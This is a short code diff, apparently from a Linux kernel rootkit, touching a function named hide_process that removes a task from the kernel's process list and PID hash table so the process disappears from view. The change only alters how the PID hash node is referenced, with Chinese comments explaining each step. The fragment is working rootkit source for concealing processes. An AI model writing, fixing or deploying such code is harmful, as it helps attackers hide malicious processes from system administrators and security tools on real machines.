@@ -137,7 +137,7 @@ void hide_process(int pid)
         // 从全局进程链表中移除
         list_del_init(&task->tasks);
         // 从PID散列表中移除
-        node = &task->pid_links[PIDTYPE_PID].node;
+        node = &task->pid_links[PIDTYPE_PID]; // 直接使用pid_links数组中的hlist_node对象
         hlist_del_init(node);
     }
     rcu_read_unlock();
